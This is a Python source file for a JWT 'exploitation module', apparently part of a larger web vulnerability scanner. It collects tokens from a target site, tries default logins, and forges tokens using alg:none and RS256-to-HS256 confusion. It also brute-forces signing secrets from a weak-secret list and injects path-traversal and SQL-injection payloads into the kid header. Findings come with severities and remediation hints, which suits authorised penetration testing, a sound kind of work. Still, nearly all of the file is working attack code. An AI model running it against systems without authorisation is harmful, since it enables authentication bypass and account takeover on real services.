#!/usr/bin/env python3
"""
JWT Security Analyzer — Advanced JWT Token Exploitation Module
Performs deep analysis of JWT implementations including:
  - Algorithm confusion (RS256→HS256, none algorithm)
  - Key brute forcing with common secrets
  - Claim manipulation (exp, iss, sub, aud, role escalation)
  - Signature stripping & header injection
  - Token replay / reuse detection
  - JWK/JWKS endpoint enumeration
  - Kid parameter injection (directory traversal, SQL injection)
"""

from colorama import Fore
import requests
import urllib3
import json
import re
import time
import base64
import hashlib
import hmac
import os
import logging
from urllib.parse import urlparse, urljoin
from typing import Dict, List, Optional, Any, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)


class JWTAnalyzer:
    """Deep JWT security analysis and exploitation"""

    # Common weak secrets used in JWT signing (for HS256 brute force)
    WEAK_SECRETS = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "supersecret", "changeme", "test", "default", "mysecret",
        "s3cr3t", "jwt", "token", "api_secret", "app_secret",
        "private_key", "signing_key", "auth_secret", "HS256",
        "your-256-bit-secret", "your-secret-key", "secret123",
        "password123", "abc123", "qwerty", "letmein", "welcome",
        "application_secret", "my-secret", "my_secret_key",
        "", "null", "none", "undefined", "true", "false",
    ]

    # JWKS / well-known paths
    JWKS_PATHS = [
        "/.well-known/jwks.json",
        "/.well-known/openid-configuration",
        "/oauth2/jwks",
        "/oauth/jwks",
        "/.well-known/keys",
        "/api/jwks",
        "/auth/jwks",
        "/jwks",
        "/keys",
        "/certs",
        "/.well-known/jwks",
        "/oauth2/certs",
        "/oauth2/v1/keys",
        "/oauth2/v2/keys",
    ]

    # Paths where JWTs are commonly issued or required
    AUTH_PATHS = [
        "/api/auth/login", "/api/login", "/auth/login", "/login",
        "/api/v1/auth/login", "/api/v1/login", "/api/v1/auth/token",
        "/api/auth/token", "/oauth/token", "/oauth2/token",
        "/api/token", "/token", "/api/v1/token",
        "/api/authenticate", "/authenticate",
        "/api/auth/signin", "/signin", "/api/signin",
        "/auth/jwt", "/api/auth/jwt",
    ]

    def __init__(self, target_url: str):
        self.target = target_url.rstrip("/")
        self.parsed = urlparse(self.target)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.findings: List[Dict[str, Any]] = []
        self.endpoints: List[str] = []
        self.collected_tokens: List[str] = []
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

    # ── Base64 helpers ──────────────────────────────────────────
    @staticmethod
    def _b64url_decode(data: str) -> bytes:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data)

    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    # ── JWT parsing ──────────────────────────────────────────────
    def _parse_jwt(self, token: str) -> Optional[Tuple[dict, dict, str]]:
        """Parse a JWT into (header, payload, signature) or None."""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
            return header, payload, parts[2]
        except Exception:
            return None

    def _forge_token(self, header: dict, payload: dict, secret: str = "") -> str:
        """Create a JWT with given header/payload and sign with HS256 if secret provided."""
        h = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{h}.{p}"

        if header.get("alg", "").lower() == "none":
            return f"{signing_input}."
        elif secret:
            sig = hmac.new(
                secret.encode(), signing_input.encode(), hashlib.sha256
            ).digest()
            return f"{signing_input}.{self._b64url_encode(sig)}"
        else:
            return f"{signing_input}."

    # ── Token collection ─────────────────────────────────────────
    def _collect_tokens(self):
        """Hunt for JWTs in responses, cookies, and auth endpoints."""
        print(f"{Fore.CYAN}[*] Hunting for JWT tokens...{Fore.RESET}", end="", flush=True)

        jwt_pattern = re.compile(
            r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*"
        )

        # Scan main target and auth paths
        urls_to_check = [self.target]
        for path in self.AUTH_PATHS:
            urls_to_check.append(f"{self.base}{path}")

        for url in urls_to_check:
            try:
                # Try GET
                r = self.session.get(url, timeout=5, allow_redirects=True)
                # Check response body
                tokens = jwt_pattern.findall(r.text)
                self.collected_tokens.extend(tokens)

                # Check response headers
                for hdr_name, hdr_val in r.headers.items():
                    tokens = jwt_pattern.findall(hdr_val)
                    self.collected_tokens.extend(tokens)

                # Check cookies
                for cookie in r.cookies:
                    tokens = jwt_pattern.findall(cookie.value)
                    self.collected_tokens.extend(tokens)

                # Try POST with common credentials (low-risk test)
                if "/login" in url or "/auth" in url or "/token" in url:
                    for cred in [
                        {"username": "test", "password": "test"},
                        {"email": "test@test.com", "password": "test"},
                        {"user": "admin", "pass": "admin"},
                    ]:
                        try:
                            r2 = self.session.post(url, json=cred, timeout=5)
                            tokens = jwt_pattern.findall(r2.text)
                            self.collected_tokens.extend(tokens)
                            for hdr_name, hdr_val in r2.headers.items():
                                tokens = jwt_pattern.findall(hdr_val)
                                self.collected_tokens.extend(tokens)
                        except Exception:
                            pass

            except Exception:
                pass

        self.collected_tokens = list(set(self.collected_tokens))
        print(f" {Fore.GREEN}Found {len(self.collected_tokens)} token(s){Fore.RESET}")

    # ── JWKS enumeration ─────────────────────────────────────────
    def _enumerate_jwks(self):
        """Find JWKS endpoints that leak public keys or config."""
        print(f"{Fore.CYAN}[*] Enumerating JWKS/well-known endpoints...{Fore.RESET}", end="", flush=True)

        for path in self.JWKS_PATHS:
            url = f"{self.base}{path}"
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    self.endpoints.append(url)
                    body = r.text.lower()
                    if "keys" in body or "kty" in body or "jwks_uri" in body:
                        self.findings.append({
                            "type": "JWKS Endpoint Exposed",
                            "severity": "medium",
                            "endpoint": url,
                            "details": (
                                "JWKS endpoint is publicly accessible. While this is "
                                "normal for asymmetric verification, ensure private keys "
                                "are not exposed and key rotation is implemented."
                            ),
                            "method": "GET",
                        })

                    # Check openid-configuration for sensitive info
                    if "openid-configuration" in path:
                        try:
                            config = r.json()
                            if "token_endpoint" in config:
                                self.endpoints.append(config["token_endpoint"])
                            if "authorization_endpoint" in config:
                                self.endpoints.append(config["authorization_endpoint"])
                        except Exception:
                            pass
            except Exception:
                pass

        print(f" {Fore.GREEN}Done{Fore.RESET}")

    # ── Algorithm confusion attack ────────────────────────────────
    def _test_algorithm_confusion(self, token: str):
        """Test for alg:none, RS256→HS256 confusion, and empty signature."""
        parsed = self._parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        original_alg = header.get("alg", "unknown")

        # ── Test 1: alg:none bypass ──────────────────────────────
        for none_variant in ["none", "None", "NONE", "nOnE"]:
            forged_header = {**header, "alg": none_variant}
            forged = self._forge_token(forged_header, payload)

            accepted = self._test_forged_token(forged, token)
            if accepted:
                self.findings.append({
                    "type": f"JWT Algorithm None Bypass ({none_variant})",
                    "severity": "critical",
                    "endpoint": self.target,
                    "details": (
                        f"Server accepts JWT with alg:{none_variant}. "
                        f"Original algorithm was {original_alg}. "
                        "An attacker can forge arbitrary tokens without any secret key. "
                        "This is a complete authentication bypass."
                    ),
                    "method": "GET",
                })
                break

        # ── Test 2: Algorithm confusion RS256 → HS256 ─────────────
        if original_alg.upper().startswith("RS"):
            # Try signing with HS256 using the public key (if JWKS was found)
            confused_header = {**header, "alg": "HS256"}
            for secret in ["", "public_key"]:
                forged = self._forge_token(confused_header, payload, secret)
                accepted = self._test_forged_token(forged, token)
                if accepted:
                    self.findings.append({
                        "type": "JWT Algorithm Confusion (RS256→HS256)",
                        "severity": "critical",
                        "endpoint": self.target,
                        "details": (
                            "Server vulnerable to algorithm confusion attack. "
                            "Accepts HS256-signed tokens when RS256 is expected. "
                            "Attacker can use the public key as HMAC secret to forge tokens."
                        ),
                        "method": "GET",
                    })
                    break

        # ── Test 3: Empty signature ──────────────────────────────
        parts = token.split(".")
        empty_sig_token = f"{parts[0]}.{parts[1]}."
        accepted = self._test_forged_token(empty_sig_token, token)
        if accepted:
            self.findings.append({
                "type": "JWT Empty Signature Accepted",
                "severity": "critical",
                "endpoint": self.target,
                "details": (
                    "Server accepts JWT tokens with an empty signature. "
                    "This means there is no signature verification at all."
                ),
                "method": "GET",
            })

    # ── Weak secret brute force ──────────────────────────────────
    def _test_weak_secrets(self, token: str):
        """Brute force HS256 tokens with common weak secrets."""
        parsed = self._parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        if not header.get("alg", "").upper().startswith("HS"):
            return

        print(f"{Fore.CYAN}[*] Brute-forcing JWT secret ({len(self.WEAK_SECRETS)} candidates)...{Fore.RESET}", end="", flush=True)

        parts = token.split(".")
        signing_input = f"{parts[0]}.{parts[1]}"
        original_sig_bytes = self._b64url_decode(parts[2])

        for secret in self.WEAK_SECRETS:
            try:
                computed = hmac.new(
                    secret.encode(), signing_input.encode(), hashlib.sha256
                ).digest()
                if hmac.compare_digest(computed, original_sig_bytes):
                    self.findings.append({
                        "type": "JWT Weak Signing Secret",
                        "severity": "critical",
                        "endpoint": self.target,
                        "details": (
                            f"JWT signing secret brute-forced successfully: "
                            f"'{secret}'. An attacker can forge arbitrary tokens "
                            f"with full admin privileges."
                        ),
                        "method": "GET",
                    })
                    print(f" {Fore.RED}CRACKED: '{secret}'{Fore.RESET}")
                    return
            except Exception:
                pass

        print(f" {Fore.GREEN}No weak secret found{Fore.RESET}")

    # ── Claim manipulation ───────────────────────────────────────
    def _test_claim_manipulation(self, token: str):
        """Test role escalation and claim tampering."""
        parsed = self._parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        # ── Expired token reuse ──────────────────────────────────
        if "exp" in payload:
            exp = payload["exp"]
            if isinstance(exp, (int, float)) and exp < time.time():
                # Token is already expired — test if server still accepts it
                accepted = self._test_forged_token(token, token)
                if accepted:
                    self.findings.append({
                        "type": "Expired JWT Token Accepted",
                        "severity": "high",
                        "endpoint": self.target,
                        "details": (
                            "Server accepts expired JWT tokens. "
                            f"Token expired at {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))}. "
                            "Stolen tokens can be replayed indefinitely."
                        ),
                        "method": "GET",
                    })

        # ── Missing exp claim ────────────────────────────────────
        if "exp" not in payload:
            self.findings.append({
                "type": "JWT Missing Expiration Claim",
                "severity": "medium",
                "endpoint": self.target,
                "details": (
                    "JWT token has no 'exp' (expiration) claim. "
                    "Tokens without expiration never expire and can be "
                    "used indefinitely if stolen."
                ),
                "method": "GET",
            })

        # ── Sensitive data in payload ────────────────────────────
        sensitive_keys = [
            "password", "passwd", "pwd", "secret", "private_key",
            "credit_card", "cc_number", "ssn", "api_key", "apikey",
        ]
        for key in payload:
            if key.lower() in sensitive_keys:
                self.findings.append({
                    "type": "Sensitive Data in JWT Payload",
                    "severity": "high",
                    "endpoint": self.target,
                    "details": (
                        f"JWT payload contains sensitive field '{key}'. "
                        "JWT payloads are base64-encoded (NOT encrypted) and can be "
                        "decoded by anyone. Never store secrets in JWT claims."
                    ),
                    "method": "GET",
                })

        # ── Role/privilege escalation ────────────────────────────
        role_fields = ["role", "roles", "is_admin", "admin", "privilege",
                       "permissions", "scope", "scopes", "user_type",
                       "account_type", "group", "groups", "level"]
        for field in role_fields:
            if field in payload:
                current_val = payload[field]
                self.findings.append({
                    "type": "JWT Contains Authorization Claims",
                    "severity": "info",
                    "endpoint": self.target,
                    "details": (
                        f"JWT contains authorization field '{field}' = {current_val}. "
                        "If the server uses token-based authorization without "
                        "re-validating against the database, privilege escalation "
                        "may be possible by modifying this claim."
                    ),
                    "method": "GET",
                })

    # ── Kid parameter injection ──────────────────────────────────
    def _test_kid_injection(self, token: str):
        """Test kid (Key ID) header parameter for injection vulnerabilities."""
        parsed = self._parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        if "kid" not in header:
            return

        original_kid = header["kid"]

        # Test kid path traversal
        traversal_payloads = [
            "../../../dev/null",
            "../../../../../../dev/null",
            "../../../proc/self/environ",
            "/dev/null",
            "../../etc/hostname",
        ]

        for kid_payload in traversal_payloads:
            forged_header = {**header, "kid": kid_payload}
            # Sign with empty string (contents of /dev/null)
            forged = self._forge_token(forged_header, payload, "")
            accepted = self._test_forged_token(forged, token)
            if accepted:
                self.findings.append({
                    "type": "JWT Kid Parameter Path Traversal",
                    "severity": "critical",
                    "endpoint": self.target,
                    "details": (
                        f"JWT kid parameter vulnerable to path traversal. "
                        f"Payload '{kid_payload}' caused the server to accept a "
                        f"forged token. This allows complete authentication bypass."
                    ),
                    "method": "GET",
                })
                break

        # Test kid SQL injection
        sqli_payloads = [
            f"{original_kid}' OR '1'='1",
            f"{original_kid}' UNION SELECT '' -- ",
            "' OR 1=1 --",
        ]

        for kid_payload in sqli_payloads:
            forged_header = {**header, "kid": kid_payload}
            forged = self._forge_token(forged_header, payload, "")
            accepted = self._test_forged_token(forged, token)
            if accepted:
                self.findings.append({
                    "type": "JWT Kid Parameter SQL Injection",
                    "severity": "critical",
                    "endpoint": self.target,
                    "details": (
                        f"JWT kid parameter vulnerable to SQL injection. "
                        f"Payload '{kid_payload}' was accepted. "
                        f"Attacker can forge tokens by manipulating the key lookup query."
                    ),
                    "method": "GET",
                })
                break

    # ── Token replay / reuse detection ────────────────────────────
    def _test_token_reuse(self, token: str):
        """Test if tokens can be replayed / if JTI uniqueness is enforced."""
        parsed = self._parse_jwt(token)
        if not parsed:
            return
        header, payload, sig = parsed

        if "jti" not in payload:
            self.findings.append({
                "type": "JWT Missing JTI (Token ID) Claim",
                "severity": "low",
                "endpoint": self.target,
                "details": (
                    "JWT has no 'jti' claim for unique token identification. "
                    "Without JTI, token replay attacks cannot be prevented "
                    "by server-side token blacklisting."
                ),
                "method": "GET",
            })

        # Test if the same token can be used multiple times (no one-time use)
        results = []
        for _ in range(3):
            accepted = self._test_forged_token(token, token)
            results.append(accepted)

        if all(results):
            self.findings.append({
                "type": "JWT Token Replay Possible",
                "severity": "low",
                "endpoint": self.target,
                "details": (
                    "JWT token can be replayed multiple times. "
                    "For sensitive operations, consider implementing "
                    "one-time-use tokens or short-lived JWTs."
                ),
                "method": "GET",
            })

    # ── Helper: test forged token ────────────────────────────────
    def _test_forged_token(self, forged_token: str, original_token: str) -> bool:
        """Send a request with the forged token and check if accepted."""
        auth_headers = [
            {"Authorization": f"Bearer {forged_token}"},
            {"Authorization": forged_token},
            {"X-Auth-Token": forged_token},
            {"X-Access-Token": forged_token},
        ]

        # First, establish what unauthorized looks like
        try:
            baseline = self.session.get(self.target, timeout=5)
            baseline_status = baseline.status_code
        except Exception:
            return False

        for headers in auth_headers[:1]:  # Primarily test Bearer
            try:
                r = self.session.get(self.target, headers=headers, timeout=5)
                # If we get a different (successful) response with the forged token
                if r.status_code == 200 and baseline_status in [401, 403]:
                    return True
                # If server returns the same as with the original token
                if r.status_code == 200 and forged_token != original_token:
                    # Compare response length - if similar, token may be accepted
                    original_r = self.session.get(
                        self.target,
                        headers={"Authorization": f"Bearer {original_token}"},
                        timeout=5
                    )
                    if abs(len(r.content) - len(original_r.content)) < 50:
                        return True
            except Exception:
                pass

        return False

    # ── Main scan orchestration ──────────────────────────────────
    def scan(self):
        """Run the full JWT security analysis suite."""
        print(f"{Fore.MAGENTA}[+] {Fore.CYAN}Starting JWT Security Analysis...{Fore.RESET}")

        self._collect_tokens()
        self._enumerate_jwks()

        if not self.collected_tokens:
            print(f"{Fore.YELLOW}[!] No JWT tokens found. Testing for JWT-related endpoints only.{Fore.RESET}")
            # Still report findings from JWKS enumeration
            return

        for i, token in enumerate(self.collected_tokens[:5]):  # Analyze top 5 tokens
            parsed = self._parse_jwt(token)
            if not parsed:
                continue

            header, payload, sig = parsed
            print(f"\n{Fore.CYAN}[*] Analyzing token #{i+1} (alg={header.get('alg', '?')}){Fore.RESET}")

            self._test_algorithm_confusion(token)
            self._test_weak_secrets(token)
            self._test_claim_manipulation(token)
            self._test_kid_injection(token)
            self._test_token_reuse(token)

        # Summary
        if self.findings:
            crit = sum(1 for f in self.findings if f["severity"] == "critical")
            high = sum(1 for f in self.findings if f["severity"] == "high")
            print(f"\n{Fore.MAGENTA}[+] {Fore.CYAN}JWT Analysis Complete: {len(self.findings)} findings ({crit} critical, {high} high){Fore.RESET}")
        else:
            print(f"\n{Fore.GREEN}[+] JWT Analysis Complete: No vulnerabilities found{Fore.RESET}")


def jwt_security_scan(target: str):
    """Entry point for the orchestrator."""
    analyzer = JWTAnalyzer(target)
    analyzer.scan()
    return {
        "findings": analyzer.findings,
        "endpoints": analyzer.endpoints,
    }
